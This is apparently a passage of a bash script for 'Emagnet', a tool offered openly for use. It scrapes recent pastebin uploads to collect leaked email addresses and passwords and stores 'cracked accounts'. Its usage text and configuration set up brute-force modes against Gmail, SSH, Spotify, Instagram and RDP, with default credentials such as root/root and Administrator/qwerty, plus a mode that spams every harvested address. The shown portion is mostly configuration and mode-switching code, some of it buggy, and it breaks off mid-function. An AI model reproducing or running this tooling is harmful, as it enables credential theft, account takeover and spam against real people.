#!/bin/bash
###############################################################################
###############################################################################
###                                                                         ###
### Author: wuseman <wuseman@nr1.nu>                                        ###
### IRC: Freenode @ wuseman                                                 ###
###                                                                         ###
###############################################################################
############################## AUTHOR WUSMAN ##################################
###############################################################################
###                                                                         ###
### If you will copy any developers work and claim you are the dev/founder  ###
### it wont make you a hacker - The only person you're fooling is yourself  ###
### so please respect all developers and GPL Licenses no matter if it's my  ###
### script, tool or project or if it's anyone else, thank you!              ###
###                                                                         ###
###############################################################################
###########################o###################################################
###############################################################################
####                                                                       ####
####  Copyright (C) 2018-2020, wuseman                                     ####
####                                                                       ####
####  This program is free software; you can redistribute it and/or modify ####
####  it under the terms of the GNU General Public License as published by ####
####  the Free Software Foundation; either version 2 of the License, or    ####
####  (at your option) any later version.                                  ####
####                                                                       ####
####  This program is distributed in the hope that it will be useful,      ####
####  but WITHOUT ANY WARRANTY; without even the implied warranty of       ####
####  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the        ####
####  GNU General Public License for more details.                         ####
####                                                                       ####
####  You must obey the GNU General Public License. If you will modify     ####
####  the file(s), you may extend this exception to your version           ####
####  of the file(s), but you are not obligated to do so.  If you do not   ####
####  wish to do so, delete this exception statement from your version.    ####
####  If you delete this exception statement from all source files in the  ####
####  program, then also delete it here.                                   ####
####                                                                       ####
###############################################################################
#################################################################################
### Last Modified: 06:58:05 - 2020-07-16
CURRENT_VERSION="3.4.3"

#### Author of emagnet will be printed if --author or -a is being used
emagnet_author() {
cat << "EOF"

 Copyright (C) 2018-2019, wuseman

 Emagnet was founded in 2015 and was released as open source
 on github.com/wuseman/emagnet in January 2018 and is licensed
 under GNU LESSER GENERAL PUBLIC LICENSE GPLv3

   - Author: wuseman <wuseman@nr1.nu>
   - IRC   : wuseman <irc.freenode.com>

 Please report bugs/issues on:

   - https://github.com/wuseman/EMAGNET/issues

EOF
}

#### Check so we are running correct version of emagnet 
emagnet_conf() {
if ! [[ -f "$HOME/.config/emagnet/emagnet.conf" ]]; then
    mkdir -p "$HOME/.config/emagnet/tmp"
    cp "./emagnet.conf" "$HOME/.config/emagnet/" &> /dev/null
fi

    CONF="$HOME/.config/emagnet/emagnet.conf"
    source "$CONF" &> /dev/null
}

#### Required tools for emagnet
emagnet_required_tools() {
     for cmd in wget curl; do 
         which $cmd &> /dev/null
             if [[ "$?" -gt 0 ]]; then 
                 echo -e "$basename$0: internal error -- $cmd is required to be installed, exiting."
                 exit 1
             fi
     done
}

#### If wrong version, then stop!
emagnet_version() {
if [[ "$VERSION" != "$CURRENT_VERSION" ]]; then
   if ! [[ -f "./emagnet.conf" ]]; then
               mv $HOME/.config/emagnet/emagnet.conf $HOME/.config/emagnet/emagnet.conf.bak &> /dev/null
               cp ./emagnet.conf $HOME/.config/emagnet/ &> /dev/null
else
               echo -e "$basename$0: internal error -- You are using an old emagnet.conf and emagnet.conf can't be found..."
               echo -e "$basename$0: internal error -- Write current emagnet.conf to ~/.config/emagnet/emagnet.conf by below command..."
               echo -e "$basename$0: internal error -- curl -sL -o ~/.config/emagnet/emagnet.conf https://raw.githubusercontent.com/wuseman/EMAGNET/emagnet/emagnet.conf"
               echo -e "$basename$0: internal error -- Once done, press arrow key up and hit enter..."
               mv $HOME/.config/emagnet/emagnet.conf $HOME/.config/emagnet/emagnet.conf.bak &> /dev/null
               exit 1
   fi
fi
}


# Check if we using right config file...
emagnet_check_version() {
if [[ -f $HOME/.config/emagnet/emagnet.conf ]]; then
grep -qio 'version=[0-9].*' $HOME/.config/emagnet/emagnet.conf
   if [[ $? -eq "0" ]]; then 
        mv $HOME/.config/emagnet/emagnet.conf $HOME/.config/emagnet/emagnet.conf.bak
        cp ./emagnet.conf $HOME/.config/emagnet/ &> /dev/null
   fi
fi
}

#### Some functions require root on almost all distros, installing missing packages for example.
emagnet_mustberoot() {
      (( ${EUID} > 0 )) && printf "%s\n" "$basename$0: internal error -- root privileges is required" && exit 1
  }

#### Print LICENSE
emagnet_license(){
  printf "%s\n" "Printing LICENSE - Use 'q' to quit"
  sleep 2
  curl -sL "https://nr1.nu/emagnet/emagnet_license.md"|less
  printf "%s\n" "Thank you.." 
}

emagnet_required_stuff() {
     if ! [[ -d "$HOME/.config/emagnet/" ]];then 
      mkdir -p "$HOME/.config/emagnet/tmp"
     fi
     cp "./emagnet.conf" $HOME/.config/emagnet/ &> /dev/null
}

#### UP NEXT! We can remove alot of old stuff in here, will be up next!
#### Paths that must be filled
emagnet_mustbefilled() {
  if [[ -z "$DEBUG"          ]];then sed -i "12d"  "$CONF";sed -i '12  i DEBUG=false'                                                                                                             "$CONF";fi
  if [[ -z "$PASTEBIN"       ]];then sed -i '21d'  "$CONF";sed -i '21  i PASTEBIN=https:\/\/nr1.nu\/emagnet\/pastebin/\$(date +%Y-%m-%d)\/pastebin.txt'                                                                                     "$CONF";fi
  if [[ -z "$TIME"           ]];then sed -i '30d'  "$CONF";sed -i "30  i TIME=200"                                                                                                                "$CONF";fi
  if [[ -z "$MYIP"           ]];then sed -i '40d'  "$CONF";sed -i "40  i MYIP=$(curl -s https://nr1.nu/i/)"                                                                                       "$CONF";fi
  if [[ -z "$WIP"            ]];then sed -i '50d'  "$CONF";sed -i '50  i WIP=https:\/\/nr1.nu\/i\/'                                                                                               "$CONF";fi
  if [[ -z "$WIP2"           ]];then sed -i '51d'  "$CONF";sed -i '51  i WIP2=https:\/\/ifconfig.co'                                                                                                                   "$CONF";fi
  if [[ -z "$EMAGNET"        ]];then sed -i '70d'  "$CONF";sed -i '70  i EMAGNET=$HOME/emagnet'                                                                                                   "$CONF";fi
  if [[ -z "$EMAGNETHOME"    ]];then sed -i "71d"  "$CONF";sed -i '71  i EMAGNETHOME=$EMAGNET\/incoming\/$(date +%Y-%m-%d)'                                                                       "$CONF";fi
  if [[ -z "$EMAGNETLOGS"    ]];then sed -i "72d"  "$CONF";sed -i '72  i EMAGNETLOGS=$EMAGNETHOME/logs'                                                                                           "$CONF";fi
  if [[ -z "$EMAGNETPW"      ]];then sed -i "73d"  "$CONF";sed -i '73  i EMAGNETPW=$EMAGNETHOME\/password-files'                                                                                  "$CONF";fi
  if [[ -z "$EMAGNETALL"     ]];then sed -i "74d"  "$CONF";sed -i '74  i EMAGNETALL=$EMAGNETHOME\/all-files'                                                                                      "$CONF";fi
  if [[ -z "$EMAGNETCRAP"    ]];then sed -i "75d"  "$CONF";sed -i '75  i EMAGNETCRAP=$EMAGNETHOME\/.pastebin'                                                                                     "$CONF";fi
  if [[ -z "$EMAGNETTEMP"    ]];then sed -i "76d"  "$CONF";sed -i '76  i EMAGNETTEMP=$EMAGNETHOME\/.temp'                                                                                         "$CONF";fi
  if [[ -z "$EMAGNETARCHIVE" ]];then sed -i "77d"  "$CONF";sed -i '77  i EMAGNETARCHIVE=$EMAGNET/archive'                                                                                         "$CONF";fi
  if [[ -z "$EMAGNETDB"      ]];then sed -i "78d"  "$CONF";sed -i '78  i EMAGNETDB=$EMAGNETHOME\/email-files'                                                                                     "$CONF";fi
  if [[ -z "$EMAGNETBACKUP"  ]];then sed -i "79d"  "$CONF";sed -i '79  i EMAGNETBACKUP=$EMAGNET/backup'                                                                                           "$CONF";fi
  if [[ -z "$EMAGNETSYNTAX"  ]];then sed -i "80d"  "$CONF";sed -i '80  i EMAGNETSYNTAX=$EMAGNETHOME\/sorted-by-syntax'                                                                            "$CONF";fi
  if [[ -z "$EMAGNETCRACKED" ]];then sed -i "81d"  "$CONF";sed -i '81  i EMAGNETCRACKED=$EMAGNET/cracked-accounts'                                                                                "$CONF";fi
  if [[ -z "$VERSION"        ]];then sed -i '90d'  "$CONF";sed -i '90  i VERSION=4.0'                                                                                                             "$CONF";fi
  if [[ -z "$THREADS"        ]];then sed -i '99d'  "$CONF";sed -i "99  i THREADS=$(xargs --show-limits -s 1 2>&1|grep -i "parallelism"|awk '{print $8}')"                                         "$CONF";fi
  if [[ -z "$IDLETIME"       ]];then sed -i '108d' "$CONF";sed -i "108 i IDLETIME=3600"                                                                                                           "$CONF";fi
  if [[ -z "$GBRUTEFORCE"    ]];then sed -i '124d' "$CONF";sed -i '124 i GBRUTEFORCE=false'                                                                                                       "$CONF";fi
  if [[ -z "$SBRUTEFORCE"    ]];then sed -i '125d' "$CONF";sed -i '125 i SBRUTEFORCE=false'                                                                                                       "$CONF";fi
  if [[ -z "$PBRUTEFORCE"    ]];then sed -i '126d' "$CONF";sed -i '126 i PBRUTEFORCE=false'                                                                                                       "$CONF";fi
  if [[ -z "$IBRUTEFORCE"    ]];then sed -i '127d' "$CONF";sed -i '127 i IBRUTEFORCE=false'                                                                                                       "$CONF";fi
  if [[ -z "$BBRUTEFORCE"    ]];then sed -i '128d' "$CONF";sed -i '128 i BBRUTEFORCE='                                                                                                    "$CONF";fi
  if [[ -z "$CBRUTEFORCE"    ]];then sed -i '129d' "$CONF";sed -i '129 i CBRUTEFORCE='                                                                                                    "$CONF";fi
  if [[ -z "$DBRUTEFORCE"    ]];then sed -i '130d' "$CONF";sed -i '130 i DBRUTEFORCE='                                                                                                    "$CONF";fi
  if [[ -z "$EBRUTEFORCE"    ]];then sed -i '131d' "$CONF";sed -i '131 i EBRUTEFORCE='                                                                                                    "$CONF";fi
  if [[ -z "$EMAIL2SEND"     ]];then sed -i '140d' "$CONF";sed -i '140 i EMAIL2SEND='                                                                                                             "$CONF";fi
  if [[ -z "$NOTIFY"         ]];then sed -i '149d' "$CONF";sed -i '149 i NOTIFY=false'                                                                                                            "$CONF";fi
  if [[ -z "$VPN"            ]];then sed -i '161d' "$CONF";sed -i '161 i VPN=false'                                                                                                               "$CONF";fi
  if [[ -z "$VPNROOT"        ]];then sed -i '162d' "$CONF";sed -i '162 i VPNROOT=/etc/openvpn'                                                                                                    "$CONF";fi
  if [[ -z "$VPNPROVIDER"    ]];then sed -i '163d' "$CONF";sed -i '163 i VPNPROVIDER=$VPNROOT/'                                                                                                   "$CONF";fi
  if [[ -z "$VPNCOUNTRYS"    ]];then sed -i '164d' "$CONF";sed -i '164 i VPNCOUNTRYS="belgium bulgaria czhech denmark spain finland uk uk-london uk-manchester greece hongkong hungaria italy"'   "$CONF";fi
  if [[ -z "$SSHUSER"        ]];then sed -i '176d' "$CONF";sed -i '176 i SSHUSER="root"'                                                                                                          "$CONF";fi
  if [[ -z "$SSHPORT"        ]];then sed -i '177d' "$CONF";sed -i '177 i SSHPORT="22"'                                                                                                            "$CONF";fi
  if [[ -z "$SSHPASS"        ]];then sed -i '178d' "$CONF";sed -i '178 i SSHPASS=root'                                                                                                                "$CONF";fi
  if [[ -z "$SSHTARGETS"     ]];then sed -i '179d' "$CONF";sed -i '179 i SSHTARGETS="$HOME/.config/emagnet/tmp/.emagnet-sshbruter.txt"'                                                           "$CONF";fi
  if [[ -z "$SSHPORTSCAN"    ]];then sed -i '180d' "$CONF";sed -i '180 i SSHPORTSCAN="$HOME/.config/emagnet/tmp/.emagnet-portscan.txt"'                                                           "$CONF";fi
  if [[ -z "$RDPUSER"        ]];then sed -i '192d' "$CONF";sed -i '192 i RDPUSER="Administrator"'                                                                                                 "$CONF";fi
  if [[ -z "$RDPPORT"        ]];then sed -i '193d' "$CONF";sed -i '193 i RDPPORT="3389"'                                                                                                          "$CONF";fi
  if [[ -z "$RDPPASS"        ]];then sed -i '194d' "$CONF";sed -i '194 i RDPPASS="qwerty"'                                                                                                        "$CONF";fi
  if [[ -z "$RDPTARGETS"     ]];then sed -i '195d' "$CONF";sed -i '195 i RDPTARGETS="$HOME/.config/emagnet/tmp/.emagnet-rdpbruter.txt"'                                                           "$CONF";fi
  if [[ -z "$RDPPORTSCAN"    ]];then sed -i '196d' "$CONF";sed -i '196 i RDPPORTSCAN="$HOME/.config/emagnet/tmp/.emagnet-portscan.txt"'                                                           "$CONF";fi
  if [[ -z "$USERAGENT"      ]];then sed -i '206d' "$CONF";sed -i '206 i USERAGENT=Mosaic/0.9'                                                                                                    "$CONF";fi
  if [[ -z "$PROXY"          ]];then sed -i '219d' "$CONF";sed -i '219 i PROXY=false'                                                                                                             "$CONF";fi                                                                                                           
  if [[ -z "$PROXYHOST"      ]];then sed -i '220d' "$CONF";sed -i '220 i PROXY=localhost'                                                                                                         "$CONF";fi
  if [[ -z "$PROXYPORT"      ]];then sed -i '221d' "$CONF";sed -i '221 i PROXY=5000'                                                                                                              "$CONF";fi
  if [[ -z "$PROXYUSER"      ]];then sed -i '222d' "$CONF";sed -i '222 i PROXY=user'                                                                                                              "$CONF";fi
  if [[ -z "$PROXYPORT"      ]];then sed -i '223d' "$CONF";sed -i '223 i PROXY=password'                                                                                                          "$CONF";fi
}

# After we downloaded and counted data we want to move all temporary files to all-files
# and also because we dont want to count data from those files twice...
emagnet_move_realtime() {
        # mv $EMAGNETTEMP/* $EMAGNETHOME/all-files &> /dev/null
         rm "$HOME/.config/emagnet/tmp/.emagnet" "$HOME/.config/emagnet/tmp/.emagnet1"  &> /dev/null
 }



# Check if we are allowed to visit pastebin before doing next function
emagnet_check_pastebin() {
emagnet_conf
  curl -s -H "$USERAGENT" https://pastebin.com > $EMAGNETTEMP/.status
    grep -qi "blocked your IP" /$EMAGNETTEMP/.status
    if [[ "$?" = "0" ]]; then 
      MYIP_PASTEBIN=$(curl -s --insecure https://nr1.nu/i/)
      echo -e "$basename$0: internal error -- pastebin blocked\e[1;31m $MYIP_PASTEBIN\e[0m, try again within 60 minutes..."
      exit 1
    fi       
      grep -qi "is under heavy load right now" /$EMAGNETTEMP/.status
   if [[ "$?" = "0" ]]; then 
      echo -e "$basename$0: internal error -- pastebin is under heavy load, please try again in a few seconds.."
      exit 1
  fi 
      grep -qi "TO GET ACCESS" /$EMAGNETTEMP/.status
   if [[ "$?" = "0" ]]; then 
      echo -e "$basename$0: internal error -- ${MYIP} does not have access to https://scrape.pastebin.com/api_scraping.php...."
   fi
      rm $EMAGNETTEMP/.status &> /dev/null
}

#### Emagnet maskot
emagnet_banner() {
cat << "EOF"
     _                      _______                      _
  _dMMMb._              .adOOOOOOOOOba.              _,dMMMb_
 dP'  ~YMMb            dOOOOOOOOOOOOOOOb            aMMP~  `Yb
 V      ~"Mb          dOOOOOOOOOOOOOOOOOb          dM"~      V
          `Mb.       dOOOOOOOOOOOOOOOOOOOb       ,dM'
           `YMb._   |OOOOOOOOOOOOOOOOOOOOO|   _,dMP'
      __     `YMMM| OP'~"YOOOOOOOOOOOP"~`YO |MMMP'     __
    ,dMMMb.     ~~' OO     `YOOOOOP'     OO `~~     ,dMMMb.
 _,dP~  `YMba_      OOb      `OOO'      dOO      _aMMP'  ~Yb._
             `YMMMM\`OOOo     OOO     oOOO'/MMMMP'
     ,aa.     `~YMMb `OOOb._,dOOOb._,dOOO'dMMP~'       ,aa.
   ,dMYYMba._         `OOOOOOOOOOOOOOOOO'          _,adMYYMb.
  ,MP'   `YMMba._      OOOOOOOOOOOOOOOOO       _,adMMP'   `YM.
  MP'        ~YMMMba._ YOOOOPVVVVVYOOOOP  _,adMMMMP~       `YM
  YMb           ~YMMMM\`OOOOI`````IOOOOO'/MMMMP~           dMP
   `Mb.           `YMMMb`OOOI,,,,,IOOOO'dMMMP'           ,dM'
     `'                  `OObNNNNNdOO'                   `'
                           `~OOOOO~'
EOF
printf "%64s \n\n" | tr ' ' '='
}

emagnet_usage() {
cat << EOF

Usage: ./$basename$0 [--author] [--emagnet] [--option] .....

  -a, --author        Show author information
  -A, --api           If you have a PRO account, set this to true
  -b, --backup        Create a compressed archive
                      - Available options: all/archive/incoming
  -B, --blocked       Check if your current IP has been blocked
  -d, --stats         Count total passwords, mail addresses and how many files you downloaded 
  -l, --license       Show license information
  -h, --help          Display this very helpful text
  -n, --notify        Set notifications on or off
  -t, --time          Set refresh time in seconds
  -v, --vpn           Toggle VPN on or off (Linux Only)
                      - Available options: true/false
                      Use: -v -p <provider> for set provider
  -V, --version       Displays version information.
  -p, --proxy         Set ssh tunnel on or off
  -i, --ip            Print you current WAN IPv4/IPv6
  -e, --emagnet       Download latest uploaded files on pastebin
                      and store email addresses and passwords
                      in sorted day directories.
  -g, --bruteforce    Same as above '-e' with brute-force mode on
                      - Available options: gmail/ssh/spotify/instagram/rdp
  -k, --kill          Kill emagnet ghost sessions
  -m, --merge         Merge all log files from incoming to archive
  -M, --move          Move all downloaded files to archive
  -s, --spam          Send email to all targets 
                      - Send email to targets in logs/emails-from-patebin.txt
                      - Choose and set file by ./$basename$0 -s /text/to/send.txt
  -S, --search        Search for email addresses and various stuff
  -q, --quiet         Run emagnet in a screen
  -x, --syntax        Download uploads sorted by syntax
                      - Valid syntaxes available on pastebin.com/languages

EOF
}

CONF="$HOME/.config/emagnet/emagnet.conf"

#### Just for make it easier to read main script
emagnet_clear() {
    clear
}

#### Check for a working connection, using google since it is up 24/7 
emagnet_iconnection() {
    ping -i "1" -c 1 google.com &> /dev/null
        if [[ "$?" -gt "0" ]]; then 
            echo -e "$basename$0: internal error -- this feature require a inernet connection but you seems to be offline, exiting.."
            exit 1
        fi
}

emagnet_optional(){ 
     sleep 0
}


# Check so all paths has been created so we can use emagnet
emagnet_paths() {
if ! [[ -d ${EMAGNETALL} ]]; then
      PATHS="${EMAGNETHOME} ${EMAGNETCRACKED} ${EMAGNETDB} ${EMAGNETPW} ${EMAGNETTEMP} ${EMAGNETCRAP} ${EMAGNETALL} ${EMAGNETARCHIVE} ${EMAGNETLOGS}"
         for DIRS in ${PATHS}; do 
          if ! [[ -d "${DIRS}" ]]; then
             mkdir -p "${DIRS}" &> /dev/null
          fi
         done
fi
}

#### Run emagnet in a screen
emagnet_screen() {
 mkdir -p /tmp/screen/S-root &> /dev/null
 chmod 755 /tmp/screen &> /dev/null
 chmod -R 700 /tmp/screen/S-root &> /dev/null
 hash screen &> /dev/null
     if [[ "$?" -gt "0" ]]; then 
       echo -e "$basename$0: internal error -- Screen is required to be installed before you can emagnet in background..."
       exit 1
     fi
         pid="$(ps aux |grep emagnet)"
         printf "$basename$0: emagnet has been started in background (pid:$(ps aux|grep "SCREEN -dmS emagnet"|awk '{print $2}'|head -n1))\n"
         screen -S "emagnet" -dm bash "$basename$0" --emagnet
}


#### If you have a ghost session of emagnet use ./emagnet -k
emagnet_kill() {
ESESSIONS=$(ps aux|grep -i emagnet |awk '{print $2}'|sed '$d')
NRESESSIONS=$(ps aux|grep -i "emagnet"|awk '{print $2}'|sed '$d'|wc -l)
NRINSCREEN="$(screen -ls |grep emagnet|awk -F"." '{print $1}'|sed 's/\t//g'|wc -l)"
INSCREEN="$(screen -ls |grep emagnet|awk -F"." '{print $1}'|sed 's/\t//g')"

 if [[ "$INSCREEN" -gt "0" ]]; then 
   for screens in "$INSCREEN"; do 
    screen -X -S "$screens" kill; 
    [[ "$?" = "0" ]] &&  echo -e "[\e[1;31m<<\e[0m] - $NRINSCREEN emagnet screens has been killed\n"
    done
 fi

   if [[ "$NRESESSIONS" -lt "3" ]]; then 
     echo -e "$basename$0: internal error -- 0 emagnet sessions is currently running";else 
     echo -e "$basename$0: killed $(echo $NRESESSIONS-2|bc) emagnet sessions"
     kill -9 $ESESSIONS &> /dev/null
   fi
}

###############################################################################
#### This is for save us some time, print analyzing when we downloding files ##
###############################################################################
emagnet_analyzing_message() {
if [[ "$GBRUTEFORCE" = "true" ]]; then
           printf "%19s \e[1;31m$(echo -e "\e[1;34mG\e[1;31mM\e[1;33mA\e[1;34mi\e[0;32mL\e\e[0m") BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n\n"
           printf "%64s \n\n" | tr ' ' '='
    elif [[ "$PBRUTEFORCE" = "true" ]]; then
           printf "%18s \e[0;32mSPOTIFY\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n\n"
           printf "%64s \n\n" | tr ' ' '='
    elif [[ "$SBRUTEFORCE" = "true" ]]; then
           printf "%20s \e[1;34mSSH\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n\n"
           printf "%64s \n\n" | tr ' ' '='
    elif [[ "$IBRUTEFORCE" = "true" ]]; then
           printf "%17s \e[0;33mINSTAGRAM\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n\n"
           printf "%64s \n\n" | tr ' ' '='
      elif [[ "$RBRUTEFORCE" = "true" ]]; then
           printf "%20s \e[1;31mRDP\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n\n"
           printf "%64s \n\n" | tr ' ' '='
    else
           sleep 0
fi
    text="Analyzing..."
    delay="0.1"
    printf "%26s"
        for analyzing in $(seq 0 $(expr length "${text}")); do 
           echo -n "${text:$analyzing:1}"
           sleep "${delay}"
        done
}

###############################################################################
#### If you have many daily dirs in incoming folder then we send everything ###
#### to our archive dir instead and merging files so everything is sorted  ####
#### in one file instead of all log files in incoming dir                  ####
###############################################################################
emagnet_merge() {
EMPTY="$(ls $EMAGNET/incoming/*/logs/|wc -l)"
if [[ "$EMPTY" = "0" ]]; then echo -e "$basename$0: internal error -- nothing to merge";exit 1;fi
DAYDIRS="$(ls $EMAGNET/incoming/|wc -l)"
DAYDIRS2="$(ls $EMAGNET/incoming/)"
LOGFILES="$(ls $EMAGNET/incoming/*/logs/*|wc -l)"
TOTM="$(cat $EMAGNET/incoming/*/logs/emails-from-pastebin.txt|wc -l)"         # Total Mail Addresses
TOTP="$(cat $EMAGNET/incoming/*/logs/passwords-from-pastebin.txt|wc -l)"      # Total passwords
TOTU="$(cat $EMAGNET/incoming/*/logs/pastebin-urls.txt|wc -l)"                # Total Urls
          emagnet_clear;emagnet_banner
          printf "%10s Merging \e[1;36m${LOGFILES}\e[0m log files from \e[1;36m${DAYDIRS}\e[0m day directories\n\n"
        printf "%64s \n\n" | tr ' ' '='
        LOGDATE="$(ls $EMAGNET/incoming/|xargs|sed 's/ /, /g')"
           for LOGDATE2 in "$(ls $EMAGNET/incoming/)"; do
            echo -e ",-> Merging logs from: $LOGDATE \n|"
            #logfiles="cracked-ssh-passwords.txt cracked-gmail-passwords.txt cracked-instagram-passwords.txt cracked-spotify-passwords.txt emagnet.log emails-from-pastebin.txt passwords-from-pastebin.txt pastebin-urls.txt"
            find $EMAGNET/incoming/*/logs/ -maxdepth 1|sed '/\/$/d' > $HOME/emagnet/.emagnet-temp-merge.txt
            touch "$EMAGNETARCHIVE/logs/$logfiles" &> /dev/null
              while read logs; do 
                  echo "$logs" >> "$EMAGNETARCHIVE/logs/$logfiles"; 
                if [[ "$?" -eq "0" ]]; then
                  printf "| %2d) [MERGED] %.100s %s\n" "$(( ++cnt ))" "$logs'"
                  sleep 1
                else
            printf "\n| %2d) [FAILED] %.31s %s" "$(( ++cnt ))" "$logs"
                  sleep 1
                fi
                  done < $HOME/emagnet/.emagnet-temp-merge.txt
                  sleep 0.2
            done
        printf "|\n"
        sleep 0.2
        rm $HOME/emagnet/.emagnet-temp-merge.txt
        printf "'- Successfully merged \e[1;32m${TOTM}\e[0m emails, \e[1;34m${TOTP}\e[0m passwords and \e[1;36m${TOTU}\e[0m urls...\n\n"

}

# MESSAGE WHILE RUNNING
emagnet_analyzer() {
emagnet_clear
emagnet_banner
if [[ "$GBRUTEFORCE" = "true" ]]; then
           printf "%19s \e[1;31m$(echo -e "\e[1;34mG\e[1;31mM\e[1;33mA\e[1;34mi\e[0;32mL\e\e[0m") BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n\n"
           printf "%64s \n\n" | tr ' ' '='
    elif [[ "$PBRUTEFORCE" = "true" ]]; then
           printf "%18s \e[0;32mSPOTIFY\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n\n"
           printf "%64s \n\n" | tr ' ' '='
    elif [[ "$SBRUTEFORCE" = "true" ]]; then
           printf "%20s \e[1;34mSSH\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n\n"
           printf "%64s \n\n" | tr ' ' '='
    elif [[ "$IBRUTEFORCE" = "true" ]]; then
           printf "%17s \e[0;33mINSTAGRAM\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n\n"
           printf "%64s \n\n" | tr ' ' '='
          elif [[ "$RBRUTEFORCE" = "true" ]]; then
           printf "%20s \e[1;31mRDP\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n\n"
           printf "%64s \n\n" | tr ' ' '='
    else
           sleep 0
fi

wait_time=$TIME
temp_cnt=${wait_time}
          while [[ "${temp_cnt}" -gt "0" ]]; do
              printf "\r         I'll Will Find You <-%2d -> It's A Matter Of Time" ${temp_cnt}
              sleep 1
              ((temp_cnt--))
          done
}

emagnet_move_files() {
EMPTY="$(ls $EMAGNET/incoming/*/*/|wc -l)"
if [[ "$EMPTY" -lt "1" ]]; then
   echo -e "$basename$0: internal error -- there is nothing to move"
   exit 1
fi

  if [[ ! -d "$EMAGNETARCHIVE/emagnet" ]]; then
    mkdir -p "$EMAGNETARCHIVE/all-files"
    mkdir -p "$EMAGNETARCHIVE/email-files"
    mkdir -p "$EMAGNETARCHIVE/password-files"
    mkdir -p "$EMAGNETARCHIVE/logs"
  fi
       printf "%s" "Moving all incoming files to archive"
       cp -rn $EMAGNET/incoming/*/all-files/* $EMAGNETARCHIVE/all-files/
       cp -rn $EMAGNET/incoming/*/email-files/* $EMAGNETARCHIVE/email-files/
       cp -rn $EMAGNET/incoming/*/password-files/* $EMAGNETARCHIVE/password-files/
       printf "%s\n" "...done."
          read -p "Wipe incoming directories (y/n): " cleanup
             if [[ "$cleanup" = "y" ]]; then
              rm -rf "$EMAGNET/incoming/"
              printf "\e[1;31mWiped\e[0m: $EMAGNET/incoming..\nDone..\n"
             else
              printf "\nAborted..\n"
            fi
}

emagnet_count_down() {
            emagnet_paths
            emagnet_conf

if [[ "$GBRUTEFORCE" = "true" ]]; then
            sed -i '125d' "$CONF"
            sed -i '125 i GBRUTEFORCE=true' "$CONF"
            sed -i '126d' "$CONF"
            sed -i '126 i SBRUTEFORCE=false' "$CONF"
            sed -i '127d' "$CONF"
            sed -i '127 i PBRUTEFORCE=false' "$CONF"
            sed -i '128d' "$CONF"
            sed -i '128 i IBRUTEFORCE=false' "$CONF"
            sed -i '129d' "$CONF"
            sed -i '129 i RBRUTEFORCE=false' "$CONF"          
            emagnet_conf
            printf "%19s \e[1;31m$(echo -e "\e[1;34mG\e[1;31mM\e[1;33mA\e[1;34mi\e[0;32mL\e\e[0m") BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
            printf "\n%64s \n\n" | tr ' ' '='
            emagnet_analyzer

    elif [[ "$SBRUTEFORCE" = "true" ]]; then
            sed -i '125d' "$CONF"
            sed -i '125 i GBRUTEFORCE=false' "$CONF"
            sed -i '126d' "$CONF"
            sed -i '126 i SBRUTEFORCE=true' "$CONF"
            sed -i '127d' "$CONF"
            sed -i '127 i PBRUTEFORCE=false' "$CONF"
            sed -i '128d' "$CONF"
            sed -i '128 i IBRUTEFORCE=false' "$CONF"
            sed -i '129d' "$CONF"
            sed -i '129 i RBRUTEFORCE=false' "$CONF" 
            emagnet_conf
            printf "%18s \e[0;32mSPOTIFY\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
            printf "\n%64s \n\n" | tr ' ' '='
            emagnet_analyzer

    elif [[ "$PBRUTEFORCE" = "true" ]]; then
            sed -i '125d' "$CONF"
          sed -i '125 i GBRUTEFORCE=false' "$CONF"
            sed -i '126d' "$CONF"
          sed -i '126 i SBRUTEFORCE=false' "$CONF"
            sed -i '127d' "$CONF"
          sed -i '127 i PBRUTEFORCE=true' "$CONF"
            sed -i '128d' "$CONF"
          sed -i '128 i IBRUTEFORCE=false' "$CONF"
            sed -i '129d' "$CONF"
          sed -i '129 i RBRUTEFORCE=false' "$CONF" 
            emagnet_conf
            printf "%20s \e[1;34mSSH\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
            printf "\n%64s \n\n" | tr ' ' '='
            emagnet_analyzer

    elif [[ "$IBRUTEFORCE" = "true" ]]; then
            sed -i '125d' "$CONF"
            sed -i '125 i GBRUTEFORCE=false' "$CONF"
            sed -i '126d' "$CONF"
            sed -i '126 i SBRUTEFORCE=false' "$CONF"
            sed -i '127d' "$CONF"
            sed -i '127 i PBRUTEFORCE=false' "$CONF"
            sed -i '128d' "$CONF"
            sed -i '128 i IBRUTEFORCE=true' "$CONF"
            sed -i '129d' "$CONF"
            sed -i '129 i RBRUTEFORCE=false' "$CONF" 
            emagnet_conf
            printf "%20s \e[0;33mINSTAGRAM\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
            printf "\n%64s \n\n" | tr ' ' '='
            emagnet_analyzer

    elif [[ "$RBRUTEFORCE" = "true" ]]; then
          sed -i '125d' "$CONF"
          sed -i '125 i GBRUTEFORCE=false' "$CONF"
            sed -i '126d' "$CONF"
          sed -i '126 i SBRUTEFORCE=false' "$CONF"
            sed -i '127d' "$CONF"
          sed -i '127 i PBRUTEFORCE=false' "$CONF"
            sed -i '128d' "$CONF"
          sed -i '128 i IBRUTEFORCE=false' "$CONF"
            sed -i '129d' "$CONF"
          sed -i '129 i RBRUTEFORCE=true' "$CONF" 
            emagnet_conf
            printf "%20s \e[0;33mINSTAGRAM\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
            printf "\n%64s \n\n" | tr ' ' '='
            emagnet_analyzer
    else
            emagnet_conf
            sed -i '125d' "$CONF"
            sed -i '125 i GBRUTEFORCE=false' "$CONF"
            sed -i '126d' "$CONF"
            sed -i '126 i SBRUTEFORCE=false' "$CONF"
            sed -i '127d' "$CONF"
            sed -i '127 i PBRUTEFORCE=false' "$CONF"
            sed -i '128d' "$CONF"
            sed -i '128 i IBRUTEFORCE=false' "$CONF"
            sed -i '129d' "$CONF"
